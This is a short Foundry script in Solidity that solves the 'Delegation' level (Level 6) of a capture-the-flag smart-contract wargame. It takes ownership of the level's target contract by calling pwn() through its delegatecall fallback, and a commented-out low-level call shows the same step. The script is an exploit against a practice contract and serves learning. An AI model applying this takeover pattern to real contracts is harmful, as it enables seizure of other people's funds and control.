// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import {Script, console} from "forge-std/Script.sol";
import {HelperFunctions} from "script/HelperFunctions.s.sol";

interface IDelegate {
    function pwn() external;
}

// ================================================================
// │                        LEVEL 6 - DELEGATION                  │
// ================================================================
contract Exploit is Script, HelperFunctions {
    function run() public {
        address targetContractAddress = getInstanceAddress();
        IDelegate targetContract = IDelegate(targetContractAddress);

        vm.startBroadcast();
        // Using interface:
        targetContract.pwn();

        // Without interface:
        // targetContractAddress.call(abi.encodeWithSignature("pwn()"));

        vm.stopBroadcast();
    }
}
